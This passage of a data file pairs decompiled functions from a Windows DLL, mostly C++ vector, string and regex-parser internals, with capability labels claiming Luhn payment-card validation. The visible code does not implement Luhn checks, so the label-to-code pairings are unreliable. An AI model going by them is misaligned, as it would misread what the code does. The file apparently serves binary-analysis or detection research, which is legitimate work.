*(puVar10 + 6) = 0;\n            uVar4 = puVar8[1];\n            uVar5 = puVar8[2];\n            uVar6 = puVar8[3];\n            *puVar10 = *puVar8;\n            puVar10[1] = uVar4;\n            puVar10[2] = uVar5;\n            puVar10[3] = uVar6;\n            uVar4 = puVar8[5];\n            uVar5 = puVar8[6];\n            uVar6 = puVar8[7];\n            puVar10[4] = puVar8[4];\n            puVar10[5] = uVar4;\n            puVar10[6] = uVar5;\n            puVar10[7] = uVar6;\n            *(puVar8 + 4) = 0;\n            *(puVar8 + 6) = 0xf;\n            *puVar8 = 0;\n            puVar10 = puVar10 + 8;\n        }\n    }\n    else {\n        for (; puVar8 != arg2; puVar8 = puVar8 + 8) {\n            *(puVar10 + 4) = 0;\n            *(puVar10 + 6) = 0;\n            uVar4 = puVar8[1];\n            uVar5 = puVar8[2];\n            uVar6 = puVar8[3];\n            *puVar10 = *puVar8;\n            puVar10[1] = uVar4;\n            puVar10[2] = uVar5;\n            puVar10[3] = uVar6;\n            uVar4 = puVar8[5];\n            uVar5 = puVar8[6];\n            uVar6 = puVar8[7];\n            puVar10[4] = puVar8[4];\n            puVar10[5] = uVar4;\n            puVar10[6] = uVar5;\n            puVar10[7] = uVar6;\n            *(puVar8 + 4) = 0;\n            *(puVar8 + 6) = 0xf;\n            *puVar8 = 0;\n            puVar10 = puVar10 + 8;\n        }\n        fcn.180013b30(puVar10, puVar10);\n        puVar2 = arg1[1];\n        puVar10 = puVar15 + 8;\n        if (arg2 != puVar2) {\n            do {\n                *(puVar10 + 4) = 0;\n                *(puVar10 + 6) = 0;\n                uVar4 = arg2[1];\n                uVar5 = arg2[2];\n                uVar6 = arg2[3];\n                *puVar10 = *arg2;\n                puVar10[1] = uVar4;\n                puVar10[2] = uVar5;\n                puVar10[3] = uVar6;\n                uVar4 = arg2[5];\n                uVar5 = arg2[6];\n                uVar6 = arg2[7];\n                puVar10[4] = arg2[4];\n                puVar10[5] = uVar4;\n                puVar10[6] = uVar5;\n                puVar10[7] = uVar6;\n                *(arg2 + 4) = 0;\n                puVar10 = puVar10 + 8;\n                *(arg2 + 6) = 0xf;\n                *arg2 = 0;\n                arg2 = arg2 + 8;\n            } while (arg2 != puVar2);\n        }\n    }\n    fcn.180013b30(puVar10, puVar10);\n    if (*arg1 != 0) {\n        fcn.180013b30(*arg1, arg1[1]);\n        iVar1 = *arg1;\n        iVar11 = iVar1;\n        if ((0xfff < (arg1[2] - iVar1 & 0xffffffffffffffe0U)) && (iVar11 = *(iVar1 + -8),  0x1f < (iVar1 - iVar11) - 8U)\n           ) {\ncode_r0x000180012c49:\n            fcn.1800b3528();\n            pcVar3 = swi(3);\n            puVar13 = (*pcVar3)();\n            return puVar13;\n        }\n        fcn.18008fb24(iVar11);\n    }\n    *arg1 = puVar13;\n    arg1[1] = puVar13 + uVar12 * 8;\n    arg1[2] = puVar13 + uVar7 * 8;\n    return puVar15;\n}\n",
        "token_count": 1869
    },
    "180012c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint * fcn.180012c50(int64_t *arg1, uint *arg2, uint *arg3)\n\n{\n    int64_t iVar1;\n    uint *puVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint64_t uVar7;\n    uint *puVar8;\n    uint64_t uVar9;\n    uint *puVar10;\n    int64_t iVar11;\n    uint64_t uVar12;\n    uint *puVar13;\n    uint64_t uVar14;\n    uint *puVar15;\n    \n    iVar1 = *arg1;\n    iVar11 = arg1[1] - iVar1 >> 5;\n    if (iVar11 == 0x7ffffffffffffff) {\n        fcn.180014900();\n        pcVar3 = swi(3);\n        puVar13 = (*pcVar3)();\n        return puVar13;\n    }\n    uVar12 = iVar11 + 1;\n    uVar9 = arg1[2] - iVar1 >> 5;\n    uVar7 = uVar12;\n    if ((uVar9 <= 0x7ffffffffffffff - (uVar9 >> 1)) && (uVar7 = (uVar9 >> 1) + uVar9,  uVar7 < uVar12)) {\n        uVar7 = uVar12;\n    }\n    puVar13 = NULL;\n    uVar14 = uVar7 * 0x20;\n    uVar9 = 0xffffffffffffffff;\n    if ((uVar7 < 0x800000000000000) && (uVar9 = uVar14,  uVar14 < 0x1000)) {\n        if (uVar14 != 0) {\n            puVar13 = fcn.18008fb2c(uVar14);\n        }\n    }\n    else {\n        uVar14 = uVar9 + 0x27;\n        if (uVar9 + 0x27 <= uVar9) {\n            uVar14 = 0xffffffffffffffff;\n        }\n        iVar11 = fcn.18008fb2c(uVar14);\n        if (iVar11 == 0) goto code_r0x000180012eca;\n        puVar13 = iVar11 + 0x27U & 0xffffffffffffffe0;\n        *(puVar13 + -2) = iVar11;\n    }\n    puVar15 = (arg2 - iVar1 & 0xffffffffffffffe0U) + puVar13;\n    *(puVar15 + 4) = 0;\n    *(puVar15 + 6) = 0;\n    uVar4 = arg3[1];\n    uVar5 = arg3[2];\n    uVar6 = arg3[3];\n    *puVar15 = *arg3;\n    puVar15[1] = uVar4;\n    puVar15[2] = uVar5;\n    puVar15[3] = uVar6;\n    uVar4 = arg3[5];\n    uVar5 = arg3[6];\n    uVar6 = arg3[7];\n    puVar15[4] = arg3[4];\n    puVar15[5] = uVar4;\n    puVar15[6] = uVar5;\n    puVar15[7] = uVar6;\n    *(arg3 + 4) = 0;\n    *(arg3 + 6) = 7;\n    *arg3 = 0;\n    puVar2 = arg1[1];\n    puVar8 = *arg1;\n    puVar10 = puVar13;\n    if (arg2 == puVar2) {\n        for (; puVar8 != puVar2; puVar8 = puVar8 + 8) {\n            *(puVar10 + 4) = 0;\n            *(puVar10 + 6) = 0;\n            uVar4 = puVar8[1];\n            uVar5 = puVar8[2];\n            uVar6 = puVar8[3];\n            *puVar10 = *puVar8;\n            puVar10[1] = uVar4;\n            puVar10[2] = uVar5;\n            puVar10[3] = uVar6;\n            uVar4 = puVar8[5];\n            uVar5 = puVar8[6];\n            uVar6 = puVar8[7];\n            puVar10[4] = puVar8[4];\n            puVar10[5] = uVar4;\n            puVar10[6] = uVar5;\n            puVar10[7] = uVar6;\n            *(puVar8 + 4) = 0;\n            *(puVar8 + 6) = 7;\n            *puVar8 = 0;\n            puVar10 = puVar10 + 8;\n        }\n    }\n    else {\n        for (; puVar8 != arg2; puVar8 = puVar8 + 8) {\n            *(puVar10 + 4) = 0;\n            *(puVar10 + 6) = 0;\n            uVar4 = puVar8[1];\n            uVar5 = puVar8[2];\n            uVar6 = puVar8[3];\n            *puVar10 = *puVar8;\n            puVar10[1] = uVar4;\n            puVar10[2] = uVar5;\n            puVar10[3] = uVar6;\n            uVar4 = puVar8[5];\n            uVar5 = puVar8[6];\n            uVar6 = puVar8[7];\n            puVar10[4] = puVar8[4];\n            puVar10[5] = uVar4;\n            puVar10[6] = uVar5;\n            puVar10[7] = uVar6;\n            *(puVar8 + 4) = 0;\n            *(puVar8 + 6) = 7;\n            *puVar8 = 0;\n            puVar10 = puVar10 + 8;\n        }\n        fcn.180013aa0(puVar10, puVar10);\n        puVar2 = arg1[1];\n        puVar10 = puVar15 + 8;\n        if (arg2 != puVar2) {\n            do {\n                *(puVar10 + 4) = 0;\n                *(puVar10 + 6) = 0;\n                uVar4 = arg2[1];\n                uVar5 = arg2[2];\n                uVar6 = arg2[3];\n                *puVar10 = *arg2;\n                puVar10[1] = uVar4;\n                puVar10[2] = uVar5;\n                puVar10[3] = uVar6;\n                uVar4 = arg2[5];\n                uVar5 = arg2[6];\n                uVar6 = arg2[7];\n                puVar10[4] = arg2[4];\n                puVar10[5] = uVar4;\n                puVar10[6] = uVar5;\n                puVar10[7] = uVar6;\n                *(arg2 + 4) = 0;\n                puVar10 = puVar10 + 8;\n                *(arg2 + 6) = 7;\n                *arg2 = 0;\n                arg2 = arg2 + 8;\n            } while (arg2 != puVar2);\n        }\n    }\n    fcn.180013aa0(puVar10, puVar10);\n    if (*arg1 != 0) {\n        fcn.180013aa0(*arg1, arg1[1]);\n        iVar1 = *arg1;\n        iVar11 = iVar1;\n        if ((0xfff < (arg1[2] - iVar1 & 0xffffffffffffffe0U)) && (iVar11 = *(iVar1 + -8),  0x1f < (iVar1 - iVar11) - 8U)\n           ) {\ncode_r0x000180012eca:\n            fcn.1800b3528();\n            pcVar3 = swi(3);\n            puVar13 = (*pcVar3)();\n            return puVar13;\n        }\n        fcn.18008fb24(iVar11);\n    }\n    *arg1 = puVar13;\n    arg1[1] = puVar13 + uVar12 * 8;\n    arg1[2] = puVar13 + uVar7 * 8;\n    return puVar15;\n}\n",
        "token_count": 1862
    },
    "1800137f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t * fcn.1800137f0(uint64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t *puVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    \n    uVar8 = arg1[2];\n    if (0x7fffffffffffffff - uVar8 < arg2) {\n        fcn.180014b60();\n        pcVar2 = swi(3);\n        puVar4 = (*pcVar2)();\n        return puVar4;\n    }\n    uVar1 = arg1[3];\n    uVar5 = arg2 + uVar8 | 0xf;\n    uVar7 = 0x7fffffffffffffff;\n    if (((uVar5 < 0x8000000000000000) && (uVar1 <= 0x7fffffffffffffff - (uVar1 >> 1))) &&\n       (uVar6 = (uVar1 >> 1) + uVar1,  uVar7 = uVar5,  uVar5 < uVar6)) {\n        uVar7 = uVar6;\n    }\n    uVar5 = uVar7 + 1;\n    if (uVar7 == 0xffffffffffffffff) {\n        uVar5 = 0xffffffffffffffff;\n    }\n    if (uVar5 < 0x1000) {\n        if (uVar5 == 0) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = fcn.18008fb2c(uVar5);\n        }\n    }\n    else {\n        uVar6 = uVar5 + 0x27;\n        if (uVar6 <= uVar5) {\n            uVar6 = 0xffffffffffffffff;\n        }\n        iVar3 = fcn.18008fb2c(uVar6);\n        if (iVar3 == 0) goto code_r0x000180013925;\n        uVar5 = iVar3 + 0x27U & 0xffffffffffffffe0;\n        *(uVar5 - 8) = iVar3;\n    }\n    arg1[2] = arg2 + uVar8;\n    arg1[3] = uVar7;\n    if (uVar1 < 0x10) {\n        fcn.1800ade80(uVar5, arg1, uVar8 + 1);\n    }\n    else {\n        uVar7 = *arg1;\n        fcn.1800ade80(uVar5, uVar7, uVar8 + 1);\n        uVar8 = uVar7;\n        if ((0xfff < uVar1 + 1) && (uVar8 = *(uVar7 - 8),  0x1f < (uVar7 - uVar8) - 8)) {\ncode_r0x000180013925:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            puVar4 = (*pcVar2)();\n            return puVar4;\n        }\n        fcn.18008fb24(uVar8);\n    }\n    *arg1 = uVar5;\n    return arg1;\n}\n",
        "token_count": 719
    },
    "18001540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180015400(int16_t **arg1)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    bool bVar6;\n    int64_t iVar7;\n    char cVar8;\n    ulong uVar9;\n    uchar (*pauVar10) [16];\n    int16_t *piVar11;\n    uchar (*pauVar12) [16];\n    \n    piVar3 = arg1[9];\n    cVar8 = fcn.180015ab0(arg1);\n    if (cVar8 == '\\0') {\n        if (*(arg1 + 0x7c) != 0x7c) {\n            return;\n        }\n        uVar9 = fcn.180015eb0(arg1 + 8, 8);\n        fcn.180015670(arg1 + 8, uVar9);\n    }\n    pauVar10 = fcn.18008fb2c(0x20);\n    *pauVar10 = ZEXT816(0);\n    pauVar10[1] = ZEXT816(0);\n    *(pauVar10[1] + 8) = 0;\n    *(*pauVar10 + 8) = 0x11;\n    *pauVar10[1] = 0;\n    **pauVar10 = vtable.std::_Node_endif.0;\n    *(pauVar10[1] + 8) = arg1[9];\n    piVar11 = arg1[9];\n    if (*(piVar11 + 8) != 0) {\n        *pauVar10[1] = *(piVar11 + 8);\n        *(*(arg1[9] + 8) + 0x18) = pauVar10;\n        piVar11 = arg1[9];\n    }\n    *(piVar11 + 8) = pauVar10;\n    arg1[9] = pauVar10;\n    pauVar12 = fcn.18008fb2c(0x30);\n    *pauVar12 = ZEXT816(0);\n    pauVar12[1] = ZEXT816(0);\n    pauVar12[2] = ZEXT816(0);\n    *(*pauVar12 + 8) = 0x10;\n    *pauVar12[1] = 0;\n    *(pauVar12[1] + 8) = 0;\n    **pauVar12 = vtable.std::_Node_if.0;\n    *pauVar12[2] = pauVar10;\n    *(pauVar12[2] + 8) = 0;\n    iVar4 = *(piVar3 + 8);\n    *(*(iVar4 + 0x18) + 0x10) = pauVar12;\n    *(pauVar12[1] + 8) = *(iVar4 + 0x18);\n    *(iVar4 + 0x18) = pauVar12;\n    *pauVar12[1] = iVar4;\n    iVar2 = *(arg1 + 0x7c);\n    while (iVar2 == 0x7c) {\n        piVar11 = *arg1;\n        if (piVar11 != arg1[2]) {\n            if (*piVar11 == 0x5c) {\n                piVar1 = piVar11 + 1;\n                if ((piVar1 == arg1[2]) ||\n                   ((((*(arg1 + 0x10) & 8) != 0 || (1 < *piVar1 - 0x28U)) &&\n                    (((*(arg1 + 0x10) & 0x10) != 0 || ((*piVar1 - 0x7bU & 0xfffd) != 0)))))) {\n                    bVar6 = false;\n                }\n                else {\n                    bVar6 = true;\n                }\n                if (bVar6) {\n                    piVar11 = piVar1;\n                }\n            }\n            *arg1 = piVar11 + 1;\n        }\n        fcn.180015150(arg1);\n        cVar8 = fcn.180015ab0(arg1);\n        if (cVar8 == '\\0') {\n            uVar9 = fcn.180015eb0(arg1 + 8, 8);\n            fcn.180015670(arg1 + 8, uVar9);\n        }\n        iVar4 = *(piVar3 + 8);\n        iVar5 = *pauVar10[1];\n        *pauVar10[1] = 0;\n        piVar11 = arg1[9];\n        arg1[9] = pauVar10;\n        *pauVar10[1] = 0;\n        *(piVar11 + 8) = pauVar10;\n        for (iVar7 = *(iVar4 + 0x28); iVar7 != 0; iVar7 = *(iVar7 + 0x28)) {\n            iVar4 = iVar7;\n        }\n        pauVar12 = fcn.18008fb2c(0x30);\n        *pauVar12 = ZEXT816(0);\n        pauVar12[1] = ZEXT816(0);\n        pauVar12[2] = ZEXT816(0);\n        *(*pauVar12 + 8) = 0x10;\n        *(pauVar12[1] + 8) = 0;\n        **pauVar12 = vtable.std::_Node_if.0;\n        *pauVar12[2] = pauVar10;\n        *(pauVar12[2] + 8) = 0;\n        *(iVar4 + 0x28) = pauVar12;\n        *pauVar12[1] = iVar5;\n        *(iVar5 + 0x18) = *(iVar4 + 0x28);\n        iVar2 = *(arg1 + 0x7c);\n    }\n    return;\n}\n",
        "token_count": 1313
    },
    "1800164d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1800164d0(int16_t **arg1)\n\n{\n    int16_t *piVar1;\n    code *pcVar2;\n    bool bVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uchar (*pauVar6) [16];\n    int16_t **ppiVar7;\n    int16_t *piVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    \n    fcn.180018d20(arg1 + 8);\n    if (*(arg1 + 0x7c) == 0x5e) {\n        *(arg1[9] + 6) = *(arg1[9] + 6) ^ 1;\n        piVar8 = *arg1;\n        if (piVar8 != arg1[2]) {\n            if (*piVar8 == 0x5c) {\n                piVar1 = piVar8 + 1;\n                if ((piVar1 == arg1[2]) ||\n                   ((((*(arg1 + 0x10) & 8) != 0 || (1 < *piVar1 - 0x28U)) &&\n                    (((*(arg1 + 0x10) & 0x10) != 0 || ((*piVar1 - 0x7bU & 0xfffd) != 0)))))) {\n                    bVar3 = false;\n                }\n                else {\n                    bVar3 = true;\n                }\n                if (bVar3) {\n                    piVar8 = piVar1;\n                }\n            }\n            *arg1 = piVar8 + 1;\n        }\n        fcn.180015150(arg1);\n    }\n    if (((*(arg1 + 0x10) & 0x20000000) != 0) && (*(arg1 + 0x7c) == 0x5d)) {\n        uVar9 = 0x5d;\n        if ((*(arg1 + 10) & 0x100) != 0) {\n            uVar4 = (**(**(arg1[0xb] + 4) + 0x40))();\n            uVar9 = uVar4;\n        }\n        piVar8 = arg1[9];\n        pauVar6 = *(piVar8 + 0x14);\n        if (pauVar6 == NULL) {\n            pauVar6 = fcn.18008fb2c(0x20);\n            *pauVar6 = ZEXT816(0);\n            pauVar6[1] = ZEXT816(0);\n            *(piVar8 + 0x14) = pauVar6;\n        }\n        (*pauVar6)[uVar9 >> 3] = (*pauVar6)[uVar9 >> 3] | 1 << (uVar9 & 7);\n        piVar8 = *arg1;\n        if (piVar8 != arg1[2]) {\n            if (*piVar8 == 0x5c) {\n                piVar1 = piVar8 + 1;\n                if ((piVar1 == arg1[2]) ||\n                   ((((*(arg1 + 0x10) & 8) != 0 || (1 < *piVar1 - 0x28U)) &&\n                    (((*(arg1 + 0x10) & 0x10) != 0 || ((*piVar1 - 0x7bU & 0xfffd) != 0)))))) {\n                    bVar3 = false;\n                }\n                else {\n                    bVar3 = true;\n                }\n                if (bVar3) {\n                    piVar8 = piVar1;\n                }\n            }\n            *arg1 = piVar8 + 1;\n        }\n        fcn.180015150(arg1);\n    }\n    ppiVar7 = arg1;\n    iVar5 = fcn.18001a1e0(arg1);\n    do {\n        if (iVar5 == 0) {\n            return;\n        }\n        if (iVar5 != 2) {\n            uVar10 = *(arg1 + 0x74);\n            if ((uVar10 == 0) && ((*(arg1 + 0x10) & 0x100000) == 0)) {\n                fcn.180015140(ppiVar7, 2);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if (*(arg1 + 0x7c) == 0x2d) {\n                piVar8 = *arg1;\n                if (piVar8 != arg1[2]) {\n                    if (*piVar8 == 0x5c) {\n                        piVar1 = piVar8 + 1;\n                        if ((piVar1 == arg1[2]) ||\n                           ((((*(arg1 + 0x10) & 8) != 0 || (1 < *piVar1 - 0x28U)) &&\n                            (((*(arg1 + 0x10) & 0x10) != 0 || ((*piVar1 - 0x7bU & 0xfffd) != 0)))))) {\n                            bVar3 = false;\n                        }\n                        else {\n                            bVar3 = true;\n                        }\n                        if (bVar3) {\n                            piVar8 = piVar1;\n                        }\n                    }\n                    *arg1 = piVar8 + 1;\n                }\n                fcn.180015150(arg1);\n                uVar4 = *(arg1 + 0x74);\n                ppiVar7 = arg1;\n                iVar5 = fcn.18001a1e0(arg1);\n                if (iVar5 == 0) {\n                    uVar4 = *(arg1 + 0x74);\n                    if (uVar4 < 0x100) {\n                        if ((*(arg1 + 10) & 0x100) != 0) {\n                            uVar4 = (**(**(arg1[0xb] + 4) + 0x40))();\n                        }\n                        piVar8 = arg1[9];\n                        pauVar6 = *(piVar8 + 0x14);\n                        if (pauVar6 == NULL) {\n                            pauVar6 = fcn.18008fb2c(0x20);\n                            *pauVar6 = ZEXT816(0);\n                            pauVar6[1] = ZEXT816(0);\n                            *(piVar8 + 0x14) = pauVar6;\n                        }\n                        (*pauVar6)[uVar4 >> 3] = (*pauVar6)[uVar4 >> 3] | 1 << (uVar4 & 7);\n                    }\n                    else {\n                        fcn.18001a870(arg1 + 8);\n                    }\n                    uVar9 = 0x2d;\n                    if ((*(arg1 + 10) & 0x100) != 0) {\n                        uVar4 = (**(**(arg1[0xb] + 4) + 0x40))();\n                        uVar9 = uVar4;\n                    }\n                    piVar8 = arg1[9];\n                    pauVar6 = *(piVar8 + 0x14);\n                    if (pauVar6 == NULL) {\n                        pauVar6 = fcn.18008fb2c(0x20);\n                        *pauVar6 = ZEXT816(0);\n                        pauVar6[1] = ZEXT816(0);\n                        *(piVar8 + 0x14) = pauVar6;\n                    }\n                    (*pauVar6)[uVar9 >> 3] = (*pauVar6)[uVar9 >> 3] | 1 << (uVar9 & 7);\n                    return;\n                }\n                if (iVar5 == 2) {\n                    fcn.180015140(ppiVar7, 8);\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                if ((*(arg1 + 0xe) & 0x800) != 0) {\n                    uVar4 = fcn.180017ba0(arg1[0xd]);\n                    ppiVar7 = arg1[0xd];\n                    *(arg1 + 0x74) = uVar4;\n                    uVar4 = fcn.180017ba0(ppiVar7);\n                }\n                if (*(arg1 + 0x74) < uVar4) {\n                    fcn.180015140(ppiVar7, 8);\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                fcn.18001a5d0(arg1 + 8);\n            }\n            else if (uVar10 < 0x100) {\n                if ((*(arg1 + 10) & 0x100) != 0) {\n                    uVar4 = (**(**(arg1[0xb] + 4) + 0x40))();\n                    uVar10 = uVar4;\n                }\n                piVar8 = arg1[9];\n                pauVar6 = *(piVar8 + 0x14);\n                if (pauVar6 == NULL) {\n                    pauVar6 = fcn.18008fb2c(0x20);\n                    *pauVar6 = ZEXT816(0);\n                    pauVar6[1] = ZEXT816(0);\n                    *(piVar8 + 0x14) = pauVar6;\n                }\n                (*pauVar6)[(uVar10 & 0xffff) >> 3] = (*pauVar6)[(uVar10 & 0xffff) >> 3] | 1 << (uVar10 & 7);\n            }\n            else {\n                fcn.18001a870(arg1 + 8);\n            }\n        }\n        ppiVar7 = arg1;\n        iVar5 = fcn.18001a1e0(arg1);\n    } while( true );\n}\n",
        "token_count": 2158
    },
    "18001667": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180016670(uint64_t arg1)\n\n{\n    uint32_t uVar1;\n    int64_t *piVar2;\n    code *pcVar3;\n    uchar auVar4 [16];\n    char cVar5;\n    ushort uVar6;\n    uint32_t uVar7;\n    uchar (*pauVar8) [16];\n    int64_t iVar9;\n    ulong arg2;\n    int64_t iVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    \n    if (((*(arg1 + 0x80) & 0x100) == 0) || (uVar11 = arg1,  cVar5 = fcn.180018220(arg1),  cVar5 == '\\0')) {\n        uVar11 = arg1;\n        cVar5 = fcn.1800186b0(arg1);\n        if (cVar5 != '\\0') {\n            uVar6 = *(arg1 + 0x74);\n            if ((*(*(arg1 + 0x48) + 8) != 6) || ((*(*(arg1 + 0x48) + 0xc) & 4) != 0)) {\n                pauVar8 = fcn.18008fb2c(0x30);\n                *pauVar8 = ZEXT816(0);\n                pauVar8[1] = ZEXT816(0);\n                pauVar8[2] = ZEXT816(0);\n                *(*pauVar8 + 8) = 6;\n                *pauVar8[1] = 0;\n                *(pauVar8[1] + 8) = 0;\n                **pauVar8 = vtable.std::_Node_str_wchar_t_.0;\n                *pauVar8[2] = 0;\n                *(pauVar8[2] + 8) = 0;\n                *(pauVar8[1] + 8) = *(arg1 + 0x48);\n                iVar9 = *(arg1 + 0x48);\n                if (*(iVar9 + 0x10) != 0) {\n                    *pauVar8[1] = *(iVar9 + 0x10);\n                    *(*(*(arg1 + 0x48) + 0x10) + 0x18) = pauVar8;\n                    iVar9 = *(arg1 + 0x48);\n                }\n                *(iVar9 + 0x10) = pauVar8;\n                *(arg1 + 0x48) = pauVar8;\n            }\n            if ((*(arg1 + 0x50) >> 8 & 1) == 0) {\n                if ((*(arg1 + 0x50) >> 0xb & 1) != 0) {\n                    uVar6 = fcn.180017ba0(*(arg1 + 0x58));\n                }\n            }\n            else {\n                piVar2 = *(*(arg1 + 0x58) + 8);\n                uVar6 = (**(*piVar2 + 0x40))(piVar2, uVar6);\n            }\n            iVar9 = *(arg1 + 0x48);\n            uVar7 = *(iVar9 + 0x24);\n            if (*(iVar9 + 0x20) < uVar7 || *(iVar9 + 0x20) == uVar7) {\n                uVar1 = uVar7 + 0x10;\n                auVar4 = ZEXT816(2) * ZEXT416(uVar1);\n                arg2 = SUB168(auVar4, 0);\n                if (SUB168(auVar4 >> 0x40, 0) != 0) {\n                    arg2 = 0xffffffffffffffff;\n                }\n                iVar10 = fcn.1800b15d0(*(iVar9 + 0x28), arg2);\n                if (iVar10 == 0) {\n                    fcn.18006df20();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                *(iVar9 + 0x28) = iVar10;\n                uVar7 = *(iVar9 + 0x24);\n                *(iVar9 + 0x20) = uVar1;\n            }\n            *(*(iVar9 + 0x28) + uVar7 * 2) = uVar6;\n            *(iVar9 + 0x24) = *(iVar9 + 0x24) + 1;\n            return;\n        }\n        if (((*(arg1 + 0x80) & 0x20000) == 0) || (cVar5 = fcn.1800182e0(arg1),  uVar11 = arg1,  cVar5 == '\\0')) {\n            fcn.180015140(uVar11, 2);\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n    }\n    else {\n        uVar7 = *(arg1 + 0x74);\n        uVar12 = uVar7;\n        if (uVar7 != 0) {\n            if (((((*(arg1 + 0x80) >> 9 & 1) == 0) || (uVar7 < 10)) && (uVar11 = uVar12,  uVar12 <= *(arg1 + 0x18))) &&\n               ((uVar12 <= *(arg1 + 0x38) && *(arg1 + 0x38) != uVar12 &&\n                (uVar11 = uVar7 & 0x1f,  (*(*(arg1 + 0x20) + (uVar12 >> 5) * 4) & 1 << (uVar7 & 0x1f)) != 0)))) {\n                pauVar8 = fcn.18008fb2c(0x28);\n                *pauVar8 = ZEXT816(0);\n                pauVar8[1] = ZEXT816(0);\n                *pauVar8[2] = 0;\n                *(pauVar8[1] + 8) = 0;\n                *pauVar8[1] = 0;\n                **pauVar8 = vtable.std::_Node_back.0;\n                *(*pauVar8 + 8) = 0xf;\n                *pauVar8[2] = uVar7;\n                *(pauVar8[1] + 8) = *(arg1 + 0x48);\n                iVar9 = *(arg1 + 0x48);\n                if (*(iVar9 + 0x10) != 0) {\n                    *pauVar8[1] = *(iVar9 + 0x10);\n                    *(*(*(arg1 + 0x48) + 0x10) + 0x18) = pauVar8;\n                    iVar9 = *(arg1 + 0x48);\n                }\n                *(iVar9 + 0x10) = pauVar8;\n                *(arg1 + 0x48) = pauVar8;\n                return;\n            }\n            fcn.180015140(uVar11, 3);\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        if ((*(arg1 + 0x80) >> 0x14 & 1) == 0) {\n            fcn.180015140(uVar11, 2);\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        fcn.180016d00(arg1 + 0x40);\n    }\n    return;\n}\n",
        "token_count": 1663
    },
    "1800167f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong fcn.1800167f0(int16_t **arg1)\n\n{\n    int16_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    bool bVar5;\n    ulong uVar6;\n    uchar (*arg2) [16];\n    int16_t *piVar7;\n    int16_t **noname_0;\n    uint64_t uVar8;\n    \n    *(arg1 + 0x1c) = *(arg1 + 0x1c) + 1;\n    uVar2 = *(arg1 + 0x10);\n    if (((uVar2 >> 0x1b & 1) == 0) && (*(arg1 + 0x7c) == 0x29)) {\n        fcn.180015140(arg1, 5);\n        pcVar4 = swi(3);\n        uVar6 = (*pcVar4)();\n        return uVar6;\n    }\n    if (((uVar2 & 0x20) == 0) || (*(arg1 + 0x7c) != 0x3f)) {\n        if ((*(arg1 + 0xe) & 0x200) == 0) {\n            iVar3 = *(arg1 + 3);\n            *(arg1 + 3) = iVar3 + 1;\n            arg2 = fcn.18008fb2c(0x28);\n            *arg2 = ZEXT816(0);\n            arg2[1] = ZEXT816(0);\n            *arg2[2] = 0;\n            *(arg2[1] + 8) = 0;\n            *arg2[1] = 0;\n            **arg2 = vtable.std::_Node_capture.0;\n            *(*arg2 + 8) = 0xd;\n            *arg2[2] = iVar3 + 1;\n            *(arg2[1] + 8) = arg1[9];\n            piVar7 = arg1[9];\n            if (*(piVar7 + 8) != 0) {\n                *arg2[1] = *(piVar7 + 8);\n                *(*(arg1[9] + 8) + 0x18) = arg2;\n                piVar7 = arg1[9];\n            }\n            *(piVar7 + 8) = arg2;\n            arg1[9] = arg2;\n            fcn.180015400(arg1);\n            fcn.180015670(arg1 + 8, arg2);\n            uVar8 = *(arg1 + 3) + 1;\n            if (*(arg1 + 3) == -1) {\n                uVar8 = 0xffffffffffffffff;\n            }\n            fcn.180017980(arg1 + 4, uVar8);\n            uVar8 = *arg2[2] >> 5;\n            *(arg1[4] + uVar8 * 2) = *(arg1[4] + uVar8 * 2) | 1 << (*arg2[2] & 0x1f);\n            goto code_r0x000180016a51;\n        }\n    }\n    else {\n        piVar7 = *arg1;\n        if (piVar7 != arg1[2]) {\n            if (*piVar7 == 0x5c) {\n                piVar1 = piVar7 + 1;\n                if ((piVar1 == arg1[2]) ||\n        